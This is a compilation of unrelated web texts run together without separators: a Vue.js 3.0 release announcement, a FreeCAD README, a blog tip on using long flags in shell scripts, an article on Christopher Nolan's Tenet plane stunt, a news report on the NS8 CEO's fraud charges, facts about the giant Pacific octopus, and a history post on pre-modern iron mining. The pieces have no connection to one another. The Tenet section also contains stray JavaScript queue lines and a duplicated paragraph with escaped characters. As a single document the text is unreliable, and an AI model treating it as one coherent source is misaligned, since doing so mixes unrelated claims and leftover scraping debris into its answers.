Today we are proud to announce the official release of Vue.js 3.0 ""One Piece"". This new major version of the framework provides improved performance, smaller bundle sizes, better TypeScript integration, new APIs for tackling large scale use cases, and a solid foundation for long-term future iterations of the framework.
The 3.0 release represents over 2 years of development efforts, featuring 30+ RFCs, 2,600+ commits, 628 pull requests from 99 contributors, plus tremendous amount of development and documentation work outside of the core repo. We would like to express our deepest gratitude towards our team members for taking on this challenge, our contributors for the pull requests, our sponsors and backers for the financial support, and the wider community for participating in our design discussions and providing feedback for the pre-release versions. Vue is an independent project created for the community and sustained by the community, and Vue 3.0 wouldn't have been possible without your consistent support.
Taking the ""Progressive Framework"" Concept Further
Vue had a simple mission from its humble beginning: to be an approachable framework that anyone can quickly learn. As our user base grew, the framework also grew in scope to adapt to the increasing demands. Over time, it evolved into what we call a ""Progressive Framework"": a framework that can be learned and adopted incrementally, while providing continued support as the user tackles more and more demanding scenarios.
Today, with over 1.3 million users worldwide*, we are seeing Vue being used in a wildly diverse range of scenarios, from sprinkling interactivity on traditional server-rendered pages, to full-blown single page applications with hundreds of components. Vue 3 takes this flexibility even further.
Layered internal modules
Vue 3.0 core can still be used via a simple <script> tag, but its internals has been re-written from the ground up into a collection of decoupled modules. The new architecture provides better maintainability, and allows end users to shave off up to half of the runtime size via tree-shaking.
These modules also exposes lower-level APIs that unlocks many advanced use cases:
The compiler supports custom AST transforms for build-time customizations (e.g. build-time i18n)
The core runtime provides first-class API for creating custom renderers targeting different render targets (e.g. native mobile, WebGL or terminals). The default DOM renderer is built using the same API.
The @vue/reactivity module exports functions that provide direct access to Vue's reactivity system, and can be used as a standalone package. It can be used to pair with other templating solutions (e.g. lit-html) or even in non-UI scenarios.
New APIs for tackling scale
The 2.x Object-based API is largely intact in Vue 3. However, 3.0 also introduces the Composition API - a new set of APIs aimed at addressing the pain points of Vue usage in large scale applications. The Composition API builds on top of the reactivity API and enables logic composition and reuse similar to React hooks, more flexible code organization patterns, and more reliable type inference than the 2.x Object-based API.
Composition API can also be used with Vue 2.x via the @vue/composition-api plugin, and there are already Composition API utility libraries that work for both Vue 2 and 3 (e.g. vueuse, vue-composable).
Performance Improvements
Vue 3 has demonstrated significant performance improvements over Vue 2 in terms of bundle size (up to 41% lighter with tree-shaking), initial render (up to 55% faster), updates (up to 133% faster), and memory usage (up to 54% less).
In Vue 3, we have taken the approach of ""compiler-informed Virtual DOM"": the template compiler performs aggressive optimizations and generates render function code that hoists static content, leaves runtime hints for binding types, and most importantly, flattens the dynamic nodes inside a template to reduce the cost of runtime traversal. The user therefore gets the best of both worlds: compiler-optimized performance from templates, or direct control via manual render functions when the use case demands.
Improved TypeScript integration
Vue 3's codebase is written in TypeScript, with automatically generated, tested, and bundled type definitions so they are always up-to-date. Composition API works great with type inference. Vetur, our official VSCode extension, now supports template expression and props type checking leveraging Vue 3's improved internal typing. Oh, and Vue 3's typing fully supports TSX if that's your preference.
Experimental Features
We have proposed two new features for Singe-File Components (SFC, aka .vue files):
<script setup>: syntactic sugar for using Composition API inside SFCs
<style vars>: state-driven CSS variables inside SFCs
These features are already implemented and available in Vue 3.0, but are provided only for the purpose of gathering feedback. They will remain experimental until the RFCs are merged.
We have also implemented a currently undocumented <Suspense> component, which allows waiting on nested async dependencies (async components or component with async setup()) on initial render or branch switch. We are testing and iterating on this feature with the Nuxt.js team (Nuxt 3 is on the way) and will likely solidify it in 3.1.
Phased Release Process
The release of Vue 3.0 marks the general readiness of the framework. While some of the frameworks sub projects may still need further work to reach stable status (specifically router and Vuex integration in the devtools), we believe it's suitable to start new, green-field projects with Vue 3 today. We also encourage library authors to start upgrading your projects to support Vue 3.
Check out the Vue 3 Libraries Guide for details on all framework sub projects.
Migration and IE11 Support
We have pushed back the migration build (v3 build with v2 compatible behavior + migration warnings) and the IE11 build due to time constraints, and are aiming to focus on them in Q4 2020. Therefore, users planning to migrate an existing v2 app or require IE11 support should be aware of these limitations at this time.
Next Steps
For the near term after release, we will focus on:
Migration build
IE11 support
Router and Vuex integration in new devtools
Further improvements to template type inference in Vetur
For the time being, the documentation websites, GitHub branches, and npm dist tags for Vue 3 and v3-targeting projects will remain under next-denoted status. This means npm install vue will still install Vue 2.x and npm install vue@next will install Vue 3. We are planning to switch all doc links, branches and dist tags to default to 3.0 by end of 2020.
At the same time, we have started planning for 2.7, which will be the last planned minor release of the 2.x release line. 2.7 will be backporting compatible improvements from v3, and emit warnings on usage of APIs that are removed/changed in v3 to help with potential migration. We are planning to work on 2.7 in Q1 2021, which will directly become LTS upon release with an 18 months maintenance lifespan.
Trying It Out

Overview

Freedom to build what you want  FreeCAD is an open-source parametric 3D
modeler made primarily to design real-life objects of any size.
Parametric modeling allows you to easily modify your design by going back into
your model history and changing its parameters.


Create 3D from 2D & back FreeCAD allows you to sketch geometry constrained
2D shapes and use them as a base to build other objects.
It contains many components to adjust dimensions or extract design details from
3D models to create high quality production ready drawings.


Designed for your needs FreeCAD is designed to fit a wide range of uses
including product design, mechanical engineering and architecture.
Whether you are a hobbyist, a programmer, an experienced CAD user,
a student or a teacher, you will feel right at home with FreeCAD.


Cross platform FreeCAD runs on Windows, Mac and Linux


Underlying technology
OpenCASCADE A powerful geometry kernel, the most important component of FreeCAD
Coin3D library Open Inventor-compliant 3D scene representation model
Python FreeCAD offers a broad Python API
Qt Graphical User Interface built with Qt

Installing
Precompiled (installable) packages are available for Windows and Mac on the
Releases page.
On most Linux distributions, FreeCAD is directly installable from the
software center application.
Other options are described at the wiki Download page.

Compiling
Compiling FreeCAD requires installation of several libraries and their
development files such as OpenCASCADe, Coin and Qt, listed in the
pages below. Once this is done, FreeCAD can be simply compiled with
cMake. On Windows, these libraries are bundled and offered by the
FreeCAD team in a convenient package. On Linux, they are usually found
in your distribution's repositories, and on Mac OSX and other platforms
you will usually need to compile them yourself.
The pages below contain up-to-date build instructions:
Linux
Windows
Mac OSX
Cygwin
MinGW
Usage & Getting help
The FreeCAD wiki contains documentation on
general FreeCAD usage, Python scripting, and development. These
pages might help you get started:

The FreeCAD forum is also a great place
to find help and solve specific problems you might encounter when
learning to use FreeCAD.

      Use long flags when scripting

I peruse a fair amount of dotfile repos, and keep seeing people use short flags inside aliases and little command line tools.
Short flags are a command line shortcut, and they do belong there, but if you’re not writing the command in a prompt, do yourself (and anyone else that may someday be reading your code) a favor and be more verbose.
Because this…
curl --silent checkip.dyndns.org \
| grep --extended-regexp --only-matching '[0-9\.]+'

…is a lot easier for a human to understand than this…
curl -s checkip.dyndns.org | grep -Eo '[0-9\.]+'

Don’t you think?

While many directors will heavily use CGI to pull off difficult movie scenes, Christopher Nolan has historically shied away from CGI whenever possible. He famously ditched the approach in The Dark Knight when it come to flipping that truck over in the street and decided to limit green screen in Interstellar. All in all, if he can figure out a practicial way to pull it off, he’ll at the very least consider it.

Now, his latest movie, Tenet, is on the way, and the newest trailer that landed gave audiences a taste of his next big cinematic special effects feat in the form of a real 747 plane crashing and blowing up. Christopher Nolan recently opened up about the stunt and why he did. Here’s what he said:

(window._jsqueue=window._jsqueue||[]).push(""d701732d-273e-4c44-b772-196dc5cbc57f"");

I planned to do it using miniatures and set-piece builds and a combination of visual effects and all the rest. We started to run the numbers... It became apparent that it would actually be more efficient to buy a real plane of the real size, and perform this sequence for real in camera, rather than build miniatures or go the CG route.


(window._jsqueue=window._jsqueue||[]).push(""8b70b108-c57d-4b75-a469-b3305c1fffb1"");
Christopher Nolan's comments to Total Film aren't completely shocking, but it is surprising that it was more efficient to blow up a real plane instead of using miniatures. Still, we’ll have to take his word for it. It’s also the type of spectacle that works well with audiences, such as how many moviegoers love when Tom Cruise does his own stunts. In some cases, people want the real thing, something Nolan seems to understand.

Though buying a 747 plane and blowing it up may have been more efficient, Christopher Nolan later seems to insinuate that it may not have been the cheaper option:

It’s a strange thing to talk about – a kind of impulse buying, I suppose,” laughs Nolan. “But we kind of did, and it worked very well, with Scott Fisher, our special-effects supervisor, and Nathan Crowley, the production designer, figuring out how to pull off this big sequence in camera.

For his next trick, Christopher Nolan would like Tenet to be the movie to bring audiences back to theaters. He’s been heavily pushing for theaters to reopen by the for Tenet to hit its July 17 release date. Of course, the final decision isn’t up to Christopher Nolan, and the prospect of theaters opening by that time could be overly optimistic.

While it's not confirmed, there's a firm chance Tenet will could delayed by WB so that it can get the proper theatrical run it deserves. And one way or another, Warner Bros. will see to it that it gets a theatrical run, as Christopher Nolan wouldn’t have it any other way.

He famously ditched the approach in The Dark Knight when it come to flipping that truck over in the street and decided to limit green screen in Interstellar. All in all, if he can figure out a practicial way to pull it off, he\u2019ll at the very least consider it.Now, his latest movie, Tenet, is on the way, and the newest trailer that landed gave audiences a taste of his next big cinematic special effects feat in the form of a real 747 plane crashing and blowing up. Christopher Nolan recently opened up about the stunt and why he did. Here\u2019s what he said: I planned to do it using miniatures and set-piece builds and a combination of visual effects and all the rest. We started to run the numbers... It became apparent that it would actually be more efficient to buy a real plane of the real size, and perform this sequence for real in camera, rather than build miniatures or go the CG route. Christopher Nolan's comments to Total Film aren't completely shocking, but it is surprising that it was more efficient to blow up a real plane instead of using miniatures. Still, we\u2019ll have to take his word for it. It\u2019s also the type of spectacle that works well with audiences, such as how many moviegoers love when Tom Cruise does his own stunts.

It was a very exciting thing to be a part of.

 The CEO of a startup that sold fraud prevention software is facing fraud charges after he was arrested Thursday by the FBI in Las Vegas. 
Adam Rogas, who abruptly resigned from NS8 earlier this month, is accused of misleading investors who poured in $123 million to his company earlier this year, a deal in which he allegedly pocketed more than $17 million.
“Adam Rogas was the proverbial fox guarding the henhouse,” acting Manhattan U.S. Attorney Audrey Strauss said in a press statement. “While raising over $100 million from investors for his fraud prevention company, Rogas himself allegedly was engaging in a brazen fraud.”
NS8 launched in 2016 to provide online fraud detection and prevention software for small businesses. More than 200 NS8 employees were laid off last week after executives told them the company was under investigation by the SEC for fraud. The news was startling for many, considering the company had announced a $123 million Series A funding round in June, led by global VC firm Lightspeed Venture Partners.
In a statement, NS8 said that its board “has learned that much of the company’s revenue and customer information had been fabricated by Mr. Rogas.” The company added that no other employees or stakeholders had been charged and that it is cooperating with federal investigators.  
In a previous statement to Forbes, Rogas said that he left the company for family and personal reasons. He then alleged that NS8’s board and current management have used “an SEC investigation that began in November of 2019 to insinuate a more insidious narrative...I did not walk away with the companies [sic] money.”
Rogas is facing multiple charges, including securities fraud and wire fraud, in separate complaints filed by the Justice Department and Securities and Exchange Commission Thursday. Charges by the Justice Department carry penalties up to 20 years in prison. Rogas is expected to face a judge in Nevada on Friday. 
In its complaint, filed in the Southern District of New York, the Justice Department alleged that from January 2019 to February 2020, between 40% and 95% of NS8’s assets were made up. During that period, the agency alleged, Rogas presented doctored bank statements to reflect over $40 million in fictitious revenue.
In the SEC’s complaint, the agency alleged that Rogas doctored NS8's bank statements to show millions of dollars in payments from customers, before sending the falsified statements and revenue figures to NS8's finance department. The agency further alleged that in at least two securities offerings, NS8 and Rogas provided investors and prospective investors with the false financial statements.
“It seems ironic that the co-founder of a company designed to prevent online fraud would engage in fraudulent activity himself,” said FBI assistant director William F. Sweeney Jr. in a statement. “We’ve seen far too many examples of unscrupulous actors engaging in this type of criminal activity.”

The giant Pacific octopus grows bigger and lives longer than any other octopus species. The size record is held by a specimen that was 30 feet across and weighed more than 600 pounds. Averages are more like 16 feet and 110 lbs.

Life Cycle

They live to be about four years old, with both males and females dying soon after breeding. Females live long enough to tend fastidiously to their eggs, but they do not eat during this months-long brooding period, and usually die soon afterwards.

Camouflage

Giant Pacific octopuses have huge, bulbous heads and are generally reddish-brown in color. Like the other members of the octopus family, though, they use special pigment cells in their skin to change colors and textures, and can blend in with even the most intricately patterned corals, plants, and rocks.

Diet and Range

They hunt at night, surviving primarily on shrimp, clams, lobsters, and fish, but have been known to attack and eat sharks as well as birds, using their sharp, beaklike mouths to puncture and tear flesh. They range throughout the temperate waters of the Pacific, from southern California to Alaska, west to the Aleutian Islands and Japan.

Intelligence and Population

Highly intelligent creatures, giant Pacific octopuses have learned to open jars, mimic other octopuses, and solve mazes in lab tests. Their population numbers are unknown, and they do not currently appear on any lists of endangered or vulnerable animals. However, they are sensitive to environmental conditions and may be suffering from high pollution levels in their range.

This week we are starting a four-part look at pre-modern iron and steel production.  As with our series on farming, we are going to follow the train of iron production from the mine to a finished object, be that a tool, a piece of armor, a simple nail, a weapon or some other object.  And I want to stress that broad framing: iron was made into more things than just swords (although swords are cool).  If you are here wondering how you go from iron-bearing rocks to a sword, these posts will tell you, but they will equally get you from those same rocks to a nail, or a workman’s hammer, or a sawblade, or a pot, or a decorative iron spiral, or a belt-buckle, or any other of a multitude of things that might be produced in iron.



Iron production is a unique topic in one key way.  If the problem with farmers is that the popular understanding of the past (either historical or fantastical) renders them effectively invisible – as indeed, it tends to render most ancient forms of production invisible – iron-working is tremendously visible, but in a series of motifs that are almost completely wrong.  Iron is treated as rare when it is common, melted in societies that almost certainly lack the furnaces to do so; swords are cast when they should be forged, quenched in ways that would ruin them and the work of the iron-worker is represented as a solitary activity when every stage of iron-working, when done at any kind of scale, was a team job (many modern traditional blacksmiths work alone, often as a hobby; ancient smiths generally did not).  The popular depiction is so consistently wrong that it doesn’t really even provide a firm basis for correction.  We are going to have to start over, from the beginning.



So this first post is going to focus on mining.  Next week we’ll take a look at ore processing, smelting in more detail, along with the pressing issue of fuel.  The week after that we’ll look at the basic principles behind forging.  And finally in the last week, we’ll ask what one might do if they wanted steel instead of iron.  As with the farming posts, there are likely to be some addendum (at least one, on Wootz steel, for sure).  Throughout all of this, we are going to look not only at the processes by which these objects were produced, but also the people who did that production.



Via the Smithsonian, a painting of an iron mine by Homer Dodge Martin (c. 1862) at Port Henry, New York.  By the 1800s, increases demand for iron ore to fuel the industrial revolution had made larger underground iron mines more common.  Here you can actually see the tailings (rock with little or no iron content which is sorted out at the mine) littering the rock face down to the shore.As with farming, there is a regional and chronological caveat necessary here: my research into metal production (and this, even more than farming, is core to my academic interests) is focused on the Roman world or – more broadly – on the broader Mediterranean and European tradition of metal-working.  There are some points where it will be necessary to note different methods or techniques in other parts of the world (early cast iron in China, for instance, or Wootz steel in India).  Likewise, I will do my best to capture changes in metal-working techniques in the medieval period.  What I am not going to cover in detail is modern steel and iron-working (that is, post-industrial-revolution), though I will occasionally note how it is different (the largest difference, by far, is that modern steel-making approaches the carbon problem from the opposite direction, with processes to remove carbon, instead of processes to add carbon).



I should also note that this post is going to focus on iron-working (and steel-working).  Copper and bronze, the other major tool-metals, are quite different (and may get their own series at some point)!

Bibliography Note at the Outset: For the sake of keeping these posts readable, especially since I don’t have a footnote function here, I am not going to laboriously cite everything at each point of reference, but instead I am going to include a bibliography up-front for the entire series.  For the beginner looking to get a basic handle on the pre-modern iron-production process, I think D. Sim & I. Ridge, Iron for the Eagles: The Iron Industry of Roman Britain (2002) offers one of the best whole-process overviews.  On technical details of the forging process, note A.W. Bealer, The Art of Blacksmithing (1969), though much of the same may be learned by conversing with traditional blacksmiths.  H. Hodges, Artifacts: An Introduction to Early Materials and Technology (1989) is more diffuse, but still has some useful information on metal production.There is a robust if somewhat aging literature on Roman mining and metallurgy.  Of particular note are (in publication order) J.F. Healy, Mining and Metallurgy in the Greek and Roman World (1978); R.F. Tylecote, The Early History of Metallurgy in Europe (1987); R. Shepherd, Ancient Mining (1993); P. Craddock, Early Metal Mining and Production (1995); V.F. Buchwald, Iron and Steel in Ancient Times (2005).  Each of these volumes has their own advantages.  Healy and Shepherd are more narrowly focused on Greek and Roman antiquity; Healy has the better coverage of processes, Shepherd the better catalog of known metal mining and processing sites in antiquity.  Both Tylecote and Craddock have a wider chronological reach; Craddock is in some ways an update of Tylecote, but the former has a stronger focus on artifacts than the latter.  Buchwald is narrowly focused on iron (the others all consider at least bronze, if not also non-tool metals) and of course, the most recent.  Finding any study on the condition of medieval mine-workers was difficult (being so far out of my field), but note J.U. Nef, “Mining and Metallurgy in medieval Civilisation” in The Cambridge Economic History of Europe, volume 2: Trade and Industry in the Middle Ages, 2nd. ed. (1987): 691-761.For the particulars of how that iron might be turned into armor, note D. Sim and J. Kaminski, Roman Imperial Armour: The Production of Early Imperial Military Armour (2012) for the Roman period and A. Williams, The Knight and the Blast Furnace: A history of the metallurgy of armour in the Middle Ages & the early modern period (2003).  For metallurgy as it fits into mobilization more generally, J. Landers, The Field and the Forge: Population, Production and Power in the Pre-Industrial West (2003) is a peerless starting point.On the value and trade in metals in the ancient world, of particular note are M. Treister, The Role of Metals in Ancient Greek History (1996) and L. Bray, “‘Horrible, Speculative, Nasty, Dangerous’: Assessing the Value of Roman Iron,” Britannia 41 (2010): 175-185.  Both of these have valuable price-data from the ancient world.



Iron Ores



In most video games, if you are looking to produce some iron things, the first problem you invariably have is finding some iron ores.  Often iron is some sort of semi-rare strategic resource available in only certain parts of the map, something that factions might fight over.  Actually finding some iron might be a serious problem.



Well, I have good news for historical you as compared to video game you: iron is the fourth most common element in earth’s crust, making up around 5% of the total mass of the part of the earth we can actually mine. Modern industry produces – and I mean this very literally – a billion tons (and change) of iron per year.  Iron is about the exact opposite of rare; almost all of the major ores of iron are dirt common.  And that’s the point.



One of the reasons that the change from using bronze (or copper) as tool metals to using iron was so important historically is that iron is just so damn abundant.  Of course iron can be used to make better tools and weapons as well, but only with proper treatment: initially, the advantage in iron was that it was cheap.  Now, as we’ll see, while the abundance of iron makes it cheap, the difficulty in working it poses technological problems; that’s why the far rarer and also generally inferior (to proper, work-hardened, heat-treated iron or steel; bronze will often exceed the performance of unalloyed iron) copper and bronze were used first: harder to find, easier to work.  We’ll get to the major problems with iron-working in subsequent weeks (they are in the processing, not the mining), but in brief the problems iron has is that it has a much higher melting point and that cast iron is functionally useless.  But let’s get back to those sources of iron.



Very small amounts of iron occur on earth as pure ‘native’ metal; the term for this, “meteoric iron” is an accurate description of where it comes from (there is also one known deposit of native ‘telluric iron‘); in practice, the sum total of these iron sources is effectively a rounding error on the amount of iron an iron-age society is going to need and so ‘pure’ iron may be disregarded as a meaningful source of iron.



Via Wikipedia, Hematite, leaving its characteristic red-rust streak.  The hematite on the left has a metallic lustre, whereas the hematite on the right has the (more common) earthy lustre.Instead, basically all iron was smelted from iron ores which required considerable processing to produce a pure metal.  There are quite a lot of ores of iron, but not all of them could be usefully processed with ancient or medieval technology.  The most commonly used iron ore was hematite (Fe2O3), with goethite (HFeO2) and limonite (FeO(OH)·nH2O) close behind.  Rarer, but still used was magnetite (Fe3O4) and siderite (FeCO3).  All of these can occur in big rock deposits, but may also occur as ‘bog iron‘ where oxidation occurs in acidic environments (in swamps and bogs) leading to the formation of small clumps of iron-rich material.  Many of these ores can be spotted visually by someone who knows what they are doing; hematite can be blackish to reddish-brown but leaves tell-tale red streaks (of rust); goethite’s black-brown color is also fairly recognizable, as is limonite with its burnt yellow-orange hue.  We’ll come back to these ores a few times both this week and next, because while they can all yield iron, some of them yield that iron easier than others.



One distinction here is between bog iron and iron in ore deposits.  Bog iron is formed when ground-water picks up iron from iron-ore deposits, where that iron is then oxidized under acidic conditions to form chunks of iron minerals (goethite, magnetite, hematite, etc.), typically in smallish chunks.  Bog iron is much easier to smelt because it contains fewer impurities than iron ore in rock deposits, but the quantity of iron available from bog iron is relatively low (although actually renewable, unlike mines; a bog can be harvested for iron again after a few decades as the processes which produce the bog iron continue).  Because of its low output, bog iron tends to be an important part of the iron supply only when production is relatively low, such as during the Pre-Roman Iron Age in Europe, or the early medieval period.



Via Wikipedia, a piece of limonite ‘bog ore.’  It has limonite’s characteristic burnt brown or yellow color.



But what I want to stress here at the outset is that while the local variety of iron may vary based on conditions, iron ores are sufficiently common that prior to the industrial revolution, it wasn’t generally necessary to trade or transport them over long distances because most areas have deposits.  There are some exceptions (Japan is notoriously mineral poor – my limited geological understanding is that this is common in volcanic land formations – and while it does have some iron deposits, they are few and relatively small), but for the most part, getting iron ore was not hard.  As we’ll see, timber availability was actually often a more pressing limitation on iron exploitation than the ore itself, but that’s a topic for next week.



Mining!



First, we have to get all of these ores out of the ground.  Finding ore in the pre-modern period was generally a matter of visual prospecting, looking for ore outcrops or looking for bits of ore in stream-beds where the stream could then be followed back to the primary mineral vein.  It’s also clear that superstition and divination often played a role; as late as 1556, Georgius Agricola feels the need to include dowsing in his description of ore prospecting techniques, though he has the good sense to reject it.



As with many ancient technologies, there is a triumph of practice over understanding in all of this; the workers have mastered the how but not the why.  Lacking an understanding of geology, for instance, meant that pre-modern miners, if the ore vein hit a fault line (which might displace the vein, making it impossible to follow directly) had to resort to sinking shafts and exploratory mining an an effort to ‘find’ it again.  In many cases ancient miners seem to have simply abandoned the works when the vein had moved only a short distance because they couldn’t manage to find it again.  Likewise, there was a common belief (e.g. Plin.  34.49) that ore deposits, if just left alone for a period of years (often thirty) would replenish themselves, a belief that continues to appear in works on mining as late as the 18th century (and lest anyone be confused, they clearly believe this about underground deposits; they don’t mean bog iron).  And so like many pre-modern industries, this was often a matter of knowing how without knowing why.



Via the British Museum, a drawing (c. 1590-1600) of mining activity, showing the use of hand-tools to mine ore in an open mine (although note the tunnel in the upper right).Once the ore was located, mining tended to follow the ore, assuming whatever shape the ore-formation was in.  For ore deposits in veins, that typically means diggings shafts and galleries (or trenches, if the deposit was shallow) that follow the often irregular, curving patterns of the veins themselves.  For ‘bedded‘ ore (where the ore isn’t in a vein, but instead an entire layer, typically created by erosion and sedimentation), this might mean ‘bell pitting’ where a shaft was dug down to the ore layer, which was then extracted out in a cylinder until the roof became unstable, at which point the works were back-filled or collapsed and the process begun again nearby.



All of this digging had to be done by hand, of course.  Iron-age mining tools (picks, chisels, hammers) fairly strongly resemble their modern counterparts and work the same way (interestingly, in contrast to things like bronze-age picks which were bronze sheaths around a wooden core, instead of a metal pick on a wooden haft).



For rock that was too tough for simple muscle-power and iron tools to remove, the typical expedient was ‘fire-setting,’ which remained a standard technique for removing tough rocks until the introduction of explosives in the modern period.  Fire-setting involves constructing a fuel-pile (typically wood) up against the exposed rock and then letting it burn (typically overnight); the heat splinters, cracks and softens the rock.  The problem of course is that the fire is going to consume all of the oxygen and let out a ton of smoke, preventing work close to an active fire (or even in the mine at all while it was happening).  Note that this is all about the cracking and splintering effect, along with chemical changes from roasting, not melting the rock – by the time the air-quality had improved to the point where the fire-set rock could be worked, it would be quite cool.  Ancient sources regularly recommend dousing these fires with vinegar, not water, and there seems to be some evidence that this would, in fact, render the rock easier to extract afterwards.



Plate from Agricola’s De Re Metallica (1556) showing the fire-setting technique (below), with the use of a ventilation shaft (top right) to keep the air at least a little breathable.By the beginning of the iron age in Europe (which varies by place, but tends to start between c. 1000 and c. 600 BC), the level of mining sophistication that we see in preserved mines is actually quite considerable.  While Bronze Age mines tend to stay above the water-table, iron-age mines often run much deeper, which raises all sorts of exciting engineering problems in ventilation and drainage.  Deep mines could be drained using simple bucket-lines, but we also see more sophisticated methods of drainage, from the Roman use of screw-pumps and water-wheels to Chinese use of chain-pumps from at least the Song Dynasty.  Ventilation was also crucial to prevent the air becoming foul; ventilation shafts were often dug, with the use of either cloth fans or lit fires at the exits to force circulation.  So mining could get very sophisticated when there was a reason to delve deep.  Water might also be used to aid in mining, by leading water over a deposit and into a sluice box where the minerals were then separated out.  This seems to have been done mostly for mining gold and tin.



Via Wikipedia, a digram of the Roman water-wheel based drainage system for raising water from the Rio Tinto mines.  While the Rio Tinto mines do actually have iron ore (indeed, it is what makes the Rio, Tinto, that is, the river red), the Romans mostly mined for copper, silver and gold there; iron exploitation, as far as I am aware, only occurs later on the site.  These wheels were constructed in series, each set raising the water up to the level of the top of the wheel, where it then flowed into the next set of wheels.  They were turned by muscle power, with workers in the turning them, hamster-wheel style.But I don’t want to get too deep into this, because almost none of this fancy complexity was used in iron mining.  Remember iron?  This is a post about iron.  As you will recall, iron’s great advantage is that iron ores are relatively abundant, which meant that it was rarely necessary or worthwhile to construct complex mining works to extract it.  Only very rich ores would induce pre-modern miners into engaging in deep underground mining for iron; for the most part, it simply wasn’t worth the effort.  One of these days, we might talk about the production chain for gold or silver or copper, which were worth the kind of effort to set up complex drainage and ventilation systems.



Instead, iron was generally mined in simple open-pit mines or trenches (if following a shallow vein), using a mix of fire-setting and iron hand-tools.  There are some instances of more complex works chasing veins of particularly rich iron ores; my understanding is that there was Roman underground mining of iron in Noricum, for instance, after c. 15 B.C. or so.  But the primary iron-mining site for Roman Italy, Elba (which has been estimated to produce a truly staggering 10,000,000 tons per year of ore for several centuries during the Republic; Diodorus (5.13.1) reports that the fires of the smelters were so continuous that the island ended up known as ‘the smokey island’ – Aethaleia – because it was always wreathed in smoke) was, as Healy notes (91) entirely opencast save for one small gallery.  As far as I can tell, the bulk of pre-modern iron mining in all periods was done in open-pit (or ‘opencast’) mines.  That makes simple all sorts of otherwise complicated problems with ventilation, drainage or ore extraction.  Large iron mines of this sort could have several thousands of workers doing this, but smaller operations were also common; there doesn’t seem to really have been a standard size for an iron-mine.



Via Wikipedia, a modern open-pit mine in Australia.  An ancient open-pit mine wouldn’t be this large, but would follow the same basic form, including the stepped sides.  It’s actually hard to find decent pictures of pre-modern open-pit mines; they don’t seem to have interested artists and because they sit on the surface (often in areas where further mining was subsequently done) they’re exposed to construction, erosion and foliage which tend to obscure older mining works.So to recap, our iron tool begins its life as a vein or bed of iron-rich ore. Our miners, detecting this ore probably by where it outcrops to the surface, have most likely constructed an open-pit mine to extract it. Bit by bit, using shovels for the soil and then picks, hammers and chisels for the rock underneath, the non-metal-bearing rock is cleared away to expose to the ore itself. The ore is then cleared in much the same manner. Where it is stubborn, the miners set fires over the rock or against the sides of their pits to shatter the stone for easier removal. Apart from this fire-setting, all of the energy to hew our bit of hematite or limonite or what have you out of the ground is provided by human muscle. Once extracted, the ore is loaded into baskets (probably wicker-work, but the exact basket depends on where we are) and manually hauled out of the pit to the surface.



Miners!



What about the fellows who did all of this work?  As always, it depends a fair bit on the period and the place.  Essentially the problem that miners faced was that while mining could be a complex and technical job, the vast majority of the labor involved was largely unskilled manual labor in difficult conditions.  Since the technical aspects could be handled by overseers, this left the miners in a situation where their working conditions depended very heavily on the degree to which their labor was scarce.



Plate from Agricola’s De Re Metallica (1556), showing a set of picks and chisels.  Although these are from the 16th century, they have the same basic form as their earlier Roman equivalents.In the ancient Mediterranean, the clear testimony of the sources is that mining was a low-status occupation, one for enslaved people, criminals and the truly desperate.  Being ‘sent to the mines’ is presented, alongside being sent to work in the mills, as a standard terrible punishment for enslaved people who didn’t obey their owners and it is fairly clear in many cases that being sent to the mines was effectively a delayed death sentence.  Diodorus Siculus describes mining labor in the goldmines of Egypt this way, in a passage that is fairly representative of the ancient sources on mining labor more generally (3.13.3, trans Oldfather (1935)):



For no leniency or respite of any kind is given to any man who is sick, or maimed, or aged, or in the case of a woman for her weakness, but all without exception are compelled by blows to persevere in their labours, until through ill-treatment they die in the midst of their tortures. Consequently the poor unfortunates believe,  because their punishment is so excessively severe, that the future will always be more terrible than the present and therefore look forward to death as more to be desired than life.



It is clear that conditions in Greek and Roman mines were not much better.  Examples of chains and fetters – and sometimes human remains still so chained – occur in numerous Greek and Roman mines.  Unfortunately our sources are mostly concerned with precious metal mines and those mines also seem to have been the worst sorts of mines to work in, since the long underground shafts and galleries exposed the miners to greater dangers from bad air to mine-collapses.  That said, it is hard to imagine working an open-pit iron mine by hand, while perhaps somewhat safer, was any less back-breaking, miserable toil, even if it might have been marginally safer.



Plate from Agricola’s De Re Metallica (1556), show the initial crushing of ore as the first stage of ore dressing.  You can see the sort of back-breaking labor this would be, especially to do in long shifts.  The workers here wear protection over their shins to avoid being injured by the splintering rock.Conditions were not always so bad though, particularly for free miners (being paid a wage) who tended to be treated better, especially where their labor was sorely needed.  For instance, a set of rules for the Roman mines at Vipasca, Spain provided for contractors to supply various amenities, including public baths maintained year-round.  The labor force at Vipasca was clearly free and these amenities seem to have been a concession to the need to make the life of the workers livable in order to get a sufficient number of them in a relatively sparsely populated part of Spain.



The conditions for miners in medieval Europe seems to have been somewhat better.  We see mining communities often setting up their own institutions and occasionally even having their own guilds (for instance, there was a coal-workers guild in Liege in the 13th century) or internal regulations.  These mining communities, which in large mining operations might become small towns in their own right, seem to have often had some degree of legal privileges when compared to the general rural population (though it should be noted that, as the mines were typically owned by the local lord or state, exemption from taxes was essentially illusory as the lord or king’s cut of the mine’s profits was the taxes).  It does seem notable that while conditions in medieval mines were never quite so bad as those in the ancient world, the rapid expansion of mining activity beginning in the 15th century seems to have coincided with a loss of the special status and privileges of earlier medieval European miners and the status associated with the labor declined back down to effectively the bottom of the social spectrum.



(That said, it seems necessary to note that precious metal-mining done by non-free Native American laborers at the order of European colonial states appears to have been every bit as cruel and deadly as mining in the ancient world.)



Georgius Agricola, describing mining in the 16th centuries, gives a sense of the hours miners worked and the pay they received, noting that in many cases miners were forced to pull multiple consecutive 7-hour shifts just to survive, with the mine itself being worked around the clock when necessary:



Since I have mentioned the shifts, I will briefly explain how these are carried on. The twenty-four hours of a day and night are divided into three shifts, and each shift consists of seven hours. The three remaining hours are intermediate between the shifts, and form an interval during which the workmen enter and leave the mines. The first shift begins at the fourth hour in the morning and lasts till the eleventh hour; the second begins at the twelfth and is finished at the seventh; these two are day shifts in the morning and afternoon. The third is the night shift, and commences at the eighth hour in the evening and finishes at the third in the morning. The Bergmeister does not allow this third shift to be imposed upon the workmen unless necessity demands it. In that case, whether they draw water from the shafts or mine the ore, they keep their vigil by the night lamps, and to prevent themselves falling asleep from the late hours or from fatigue, they lighten their long and arduous labours by singing, which is neither wholly untrained nor unpleasing. In some places one miner is not allowed to undertake two shifts in succession, because it often happens that he either falls asleep in the mine, overcome by exhaustion from too much labour, or arrives too late for his shift, or leaves sooner than he ought. Elsewhere he is allowed to do so, because he cannot subsist on the pay of one shift, especially if provisions grow dearer. [emphasis mine]



